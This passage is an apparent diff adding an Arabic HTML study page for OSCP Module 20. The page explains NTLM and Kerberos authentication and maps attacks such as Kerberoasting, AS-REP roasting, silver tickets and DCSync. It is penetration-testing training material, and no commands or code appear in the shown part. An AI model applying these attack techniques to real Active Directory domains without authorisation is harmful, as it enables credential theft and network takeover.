@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 20: مهاجمة مصادقة Active Directory</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;
+    --border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout ul{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  /* SVG helpers */
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-20$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 20</span>
+    <h1>مهاجمة مصادقة Active Directory (Attacking AD Authentication)</h1>
+    <p class="lede">من فهم بروتوكولَي NTLM وKerberos من الداخل — لاستغلال كل نقطة ضعف فيهما: Password Spraying، AS-REP Roasting، Kerberoasting، Silver Tickets، ووصولاً لهجوم DCSync الذي يُفرِّغ كل بيانات اعتماد الدومين.</p>
+    <div class="tags">
+      <span class="tag">ntlm</span>
+      <span class="tag">kerberos</span>
+      <span class="tag">lsass</span>
+      <span class="tag">password-spraying</span>
+      <span class="tag">as-rep-roasting</span>
+      <span class="tag">kerberoasting</span>
+      <span class="tag">silver-ticket</span>
+      <span class="tag">dcsync</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>أساسيات مصادقة Active Directory</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>NTLM Authentication — شرح تفصيلي</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>Kerberos Authentication — شرح تفصيلي</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>بيانات الاعتماد المخزَّنة وLSASS</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>Password Spraying في AD</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>AS-REP Roasting</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span>Kerberoasting</span></a>
+  <a class="toc-item" href="#lu8"><span class="toc-num">08</span><span>Silver Tickets</span></a>
+  <a class="toc-item" href="#lu9"><span class="toc-num">09</span><span>DCSync Attack</span></a>
+  <a class="toc-item" href="#methodology"><span class="toc-num">--</span><span>منهجية الهجوم المتكامل على AD Auth</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">أساسيات مصادقة Active Directory</span></h2>
+
+<h3>ليه المصادقة هي سطح الهجوم الأساسي؟</h3>
+<p>Active Directory مبني بالكامل حول فكرة المصادقة. كل عملية وصول لمورد — مشاركات ملفات، RDP، بريد إلكتروني، تطبيقات ويب — بتتطلب إثبات هوية أولاً. ومن هنا القاعدة الأهم في هجمات AD: <strong>التحكّم في عملية المصادقة يعني التحكّم في الوصول لكل حاجة في الدومين.</strong></p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>بروتوكولان أساسيان للمصادقة في AD: <strong>NTLM</strong> (قديم، يُستخدم كـ Fallback) و<strong>Kerberos</strong> (حديث، افتراضي منذ Windows Server 2003)</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>كلا البروتوكولين بيخزّنا مواد حساسة محليًا على الجهاز — وهنا بالظبط هدف المهاجم</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>NTLM hashes وKerberos TGT/TGS Tickets — كلهم مخزَّنين في ذاكرة <strong>LSASS</strong></span></div>
+</div>
+
+<h3>أين تُخزَّن بيانات الاعتماد الحساسة؟</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">01</span>
+  <div class="mtitle">NTLM Hashes</div>
+  <div class="mdesc">مخزَّنة في ذاكرة LSASS — قابلة للتكسير أوفلاين (Crackable) وقابلة لإعادة الاستخدام مباشرةً (Reusable) بدون الحاجة لمعرفة كلمة المرور الفعلية.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">02</span>
+  <div class="mtitle">Kerberos TGT / TGS Tickets</div>
+  <div class="mdesc">مخزَّنة هي كمان في LSASS — قابلة للسرقة (Stealable) والحقن في جلسة تانية (Injectable) عبر تقنيات زي Pass-the-Ticket.</div>
+</div>
+</div>
+
+<h3>خريطة تقنيات الهجوم على المصادقة</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>البروتوكول</th><th>المتطلَّب</th><th>الأثر</th></tr></thead>
+<tbody>
+<tr><td>Password Spraying</td><td>NTLM / Kerberos</td><td>بدون بيانات اعتماد</td><td>بيانات اعتماد دومين صالحة</td></tr>
+<tr><td>AS-REP Roasting</td><td>Kerberos</td><td>بدون بيانات اعتماد</td><td>هاش كلمة مرور حساب مُهيَّأ بشكل خاطئ</td></tr>
+<tr><td>Kerberoasting</td><td>Kerberos</td><td>أي مستخدم دومين</td><td>هاش كلمة مرور حساب خدمة</td></tr>
+<tr><td>Silver Ticket</td><td>Kerberos</td><td>NTLM hash لحساب خدمة</td><td>وصول غير مصرَّح به لخدمة محدَّدة</td></tr>
+<tr><td>DCSync</td><td>DRSUAPI</td><td>صلاحيات DA أو Replication</td><td>كل هاشات كلمات مرور الدومين</td></tr>
+<tr><td>Pass-the-Hash</td><td>NTLM</td><td>NTLM hash</td><td>حركة جانبية بدون معرفة كلمة المرور</td></tr>
+<tr><td>Pass-the-Ticket</td><td>Kerberos</td><td>TGT صالح</td><td>انتحال شخصية المستخدم لأي خدمة</td></tr>
+</tbody>
+</table></div>
+
+<div class="callout note">
+<div class="callout-label">خريطة الموديول</div>
+<p>الجدول ده هو خريطة سريعة لكل هجمات الموديول — كل تقنية هيتم تفكيكها بالتفصيل في القسم المخصَّص ليها، مع الأدوات والأوامر العملية على Windows وLinux.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">NTLM Authentication — شرح تفصيلي</span></h2>
+
+<h3>امتى بيتم استخدام NTLM؟</h3>
+<p>Kerberos هو البروتوكول المفضَّل دايمًا، لكن NTLM بيُستخدم كـ <strong>Fallback</strong> في الحالات دي:</p>
+<ul>
+<li>العميل بيتصل بالسيرفر عن طريق IP Address بدل Hostname</li>
+<li>الـ Hostname مش قابل للـ Resolve عبر AD-integrated DNS</li>
+<li>السيرفر المستهدَف مش Domain-joined</li>
+<li>تطبيقات قديمة (Legacy) أو Third-party محتاجة NTLM صراحةً</li>
+</ul>
+
+<div class="callout warning">
+<div class="callout-label">ليه NTLM لسه مهم</div>
+<p>مش ممكن تعطيل NTLM تمامًا في أغلب البيئات لأن ده هيكسر التوافق مع أنظمة قديمة — وهو لسه موجود حتى في بيئات Windows Server 2022 الحديثة. أي مختبر اختراق هيواجه NTLM تقريبًا في كل بيئة AD.</p>
+</div>
+
+<h3>تدفّق مصادقة NTLM خطوة بخطوة</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحويل كلمة المرور إلى NTLM Hash</div>
+<div class="step-body"><p>العميل بيحوّل كلمة مرور المستخدم لهاش NTLM باستخدام خوارزمية MD4 — الهاش ده مش بيتغيّر لحد ما كلمة المرور تتغيّر.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">إرسال اسم المستخدم</div>
+<div class="step-body"><p>العميل بيبعت اسم المستخدم للسيرفر المستهدَف بشكل Plaintext لبدء عملية المصادقة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">السيرفر بيبعت Nonce (Challenge)</div>
+<div class="step-body"><p>السيرفر بيولّد قيمة Challenge عشوائية بطول 64-bit — فريدة لكل جلسة، وبتمنع هجمات الـ Replay.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">العميل بيشفّر الـ Challenge</div>
+<div class="step-body"><p>العميل بيشفّر الـ Nonce باستخدام NTLM Hash → بينتج "الـ Response" — وده بيثبت معرفته بالهاش من غير ما يكشفه.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">السيرفر بيحوّل البيانات للـ DC</div>
+<div class="step-body"><p>السيرفر بيبعت: اسم المستخدم + الـ Challenge الأصلي + Response العميل المشفَّر → للـ Domain Controller للتحقق.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">الـ DC بيتحقق من الـ Response</div>
+<div class="step-body"><p>الـ DC بيسترجع الهاش المخزَّن، بيشفّر نفس الـ Challenge، وبيقارن النتيجتين → تطابق = مصادقة ناجحة، عدم تطابق = رفض.</p></div>
+</div>
+</div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg">
+  <rect x="10" y="55" width="140" height="60" rx="7" class="dsvg-box-b"/>
+  <text x="80" y="80" text-anchor="middle" class="dsvg-blue" font-size="12" font-weight="700">Client</text>
+  <text x="80" y="98" text-anchor="middle" class="dsvg-muted" font-size="9">NTLM Hash (MD4)</text>
+
+  <rect x="280" y="55" width="140" height="60" rx="7" class="dsvg-box"/>
+  <text x="350" y="80" text-anchor="middle" class="dsvg-txt" font-size="12" font-weight="700">Server</text>
+  <text x="350" y="98" text-anchor="middle" class="dsvg-muted" font-size="9">ينشئ Challenge</text>
+
+  <rect x="550" y="55" width="140" height="60" rx="7" class="dsvg-box-r"/>
+  <text x="620" y="80" text-anchor="middle" class="dsvg-red" font-size="12" font-weight="700">Domain Controller</text>
+  <text x="620" y="98" text-anchor="middle" class="dsvg-muted" font-size="9">يتحقّق من Response</text>
+
+  <text x="215" y="48" text-anchor="middle" class="dsvg-muted" font-size="9">① Username →</text>
+  <text x="215" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">← ② Challenge / ③ Response</text>
+  <text x="485" y="48" text-anchor="middle" class="dsvg-muted" font-size="9">④ Username + Challenge + Response →</text>
+  <text x="485" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">← ⑤ Match / No Match</text>
+
+  <line x1="150" y1="60" x2="280" y2="60" class="dsvg-line"/>
+  <line x1="150" y1="110" x2="280" y2="110" class="dsvg-line"/>
+  <line x1="420" y1="60" x2="550" y2="60" class="dsvg-line"/>
+  <line x1="420" y1="110" x2="550" y2="110" class="dsvg-line"/>
+</svg>
+<div class="diagram-caption">السيرفر بيتحقق مع الـ DC في كل محاولة مصادقة — لا يوجد تخزين دائم لجلسة NTLM</div>
+</div>
+
+<h3>خصائص الأمان ونقاط الضعف</h3>
+<div class="callout note">
+<div class="callout-label">ما الذي تحميه NTLM</div>
+<p>كلمة المرور مش بتتبعت أبدًا بشكل Plaintext عبر الشبكة. الـ Challenge بيمنع هجمات الـ Replay لأن كل Nonce فريد.</p>
+</div>
+<div class="callout danger">
+<div class="callout-label">نقاط الضعف الحرجة</div>
+<ul>
+<li>الهاش بيساوي كلمة المرور فعليًا — لو اتسرق الهاش تقدر تتصادق كأنك المستخدم (Pass-the-Hash)</li>
+<li>خوارزمية MD4 سريعة جدًا → مليارات المحاولات في الثانية باستخدام GPU حديث</li>
+<li>مفيش Salting — يعني جداول Rainbow Tables جاهزة ممكن تستخدم</li>
+<li>الهاش مش بيتغيّر لحد ما كلمة المرور تتغيّر → وقت غير محدود للتكسير الأوفلاين</li>
+<li>هاشات NTLMv2 المُلتقَطة عبر الشبكة ممكن تتكسّر أو تتعمل لها Relay</li>
+</ul>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">Kerberos Authentication — شرح تفصيلي</span></h2>
+
+<h3>المفاهيم الأساسية</h3>
+<ul>
+<li>مأخوذ من بروتوكول MIT's Kerberos v5 — الافتراضي في AD منذ Windows Server 2003</li>
+<li>بيستخدم طرف ثالث موثوق (الـ KDC على الـ Domain Controller) بدل المصادقة المباشرة مع السيرفر</li>
+<li>نظام قائم على التذاكر (Tickets) — بمجرد المصادقة، التذاكر بتمنح الوصول من غير إعادة إدخال كلمة المرور</li>
+<li>ثلاث مراحل: المرحلة 1 — تسجيل الدخول الأولي (Client → KDC → TGT) · المرحلة 2 — طلب الخدمة (Client → KDC → TGS) · المرحلة 3 — الوصول للخدمة (Client → Application Server)</li>
+<li>الأهم: كلمات المرور مش بتتبعت أبدًا عبر الشبكة</li>
+</ul>
+
+<h3>المرحلة الأولى — الحصول على TGT</h3>
+<ul>
+<li>العميل بيبعت <strong>AS-REQ</strong> (Authentication Service Request) للـ KDC، تحتوي على اسم المستخدم + Timestamp مشفّرة بهاش كلمة مرور المستخدم</li>
+<li>الـ KDC بيتحقق عن طريق:
+  <ul>
+  <li>البحث عن هاش كلمة مرور المستخدم في NTDS.DIT</li>
+  <li>فك تشفير الـ Timestamp — النجاح يعني إن المستخدم هو فعلًا صاحب الهوية</li>
+  <li>التأكد إن الـ Timestamp حديثة — بيمنع هجمات الـ Replay</li>
+  </ul>
+</li>
+<li>الـ KDC بيرد بـ <strong>AS-REP</strong> تحتوي على: Session Key (مشفّرة بهاش المستخدم) + <strong>TGT</strong> (مشفّرة بهاش حساب KRBTGT — العميل مش قادر يقرأها)</li>
+<li>الـ TGT صالحة لمدة 10 ساعات افتراضيًا — قابلة للتجديد بدون إعادة مصادقة</li>
+</ul>
+
+<h3>المرحلة الثانية — الحصول على Service Ticket (TGS)</h3>
+<ul>
+<li>العميل بيبعت <strong>TGS-REQ</strong> للـ KDC لما يحتاج يوصل لخدمة معيّنة، الطلب بيحتوي على: الـ TGT، اسم الخدمة المستهدَفة (SPN)، وTimestamp مشفّرة بالـ Session Key من المرحلة الأولى</li>
+<li>الـ KDC بيرد بـ <strong>TGS-REP</strong> تحتوي على: Session Key جديدة للتواصل مع الخدمة + <strong>Service Ticket</strong> مشفّرة بهاش حساب الخدمة نفسه (NTLM hash الخاص بالـ Service Account)</li>
+</ul>
+<div class="callout warning">
+<div class="callout-label">نقطة حرجة</div>
+<p>تشفير الـ Service Ticket بهاش حساب الخدمة — مش هاش الـ KDC — هو الأساس اللي بيُبنى عليه هجوم <strong>Kerberoasting</strong> بالكامل.</p>
+</div>
+
+<h3>المرحلة الثالثة — الوصول لسيرفر التطبيق</h3>
+<ul>
+<li>العميل بيبعت <strong>AP-REQ</strong> لسيرفر التطبيق، يحتوي على: Service Ticket + Timestamp مشفّرة بـ Session Key الخدمة</li>
+<li>السيرفر بيفكّ تشفير الـ Service Ticket باستخدام بيانات اعتماد حسابه الخاص، وبيستخرج: هوية المستخدم، عضويات المجموعات، الصلاحيات، وSession Key</li>
+<li>السيرفر بيتحقق من الـ Timestamp ويمنح الوصول</li>
+<li><strong>PAC</strong> (Privileged Attribute Certificate): تحتوي على عضويات المستخدم وصلاحياته — التحقق منها عند الـ DC اختياري، وغالبًا بيتعطّل لأسباب الأداء</li>
+</ul>
+<div class="callout danger">
+<div class="callout-label">نتيجة مباشرة</div>
+<p>بدون التحقق من الـ PAC عند الـ DC → هجوم <strong>Silver Ticket</strong> يصبح ممكنًا.</p>
+</div>
+
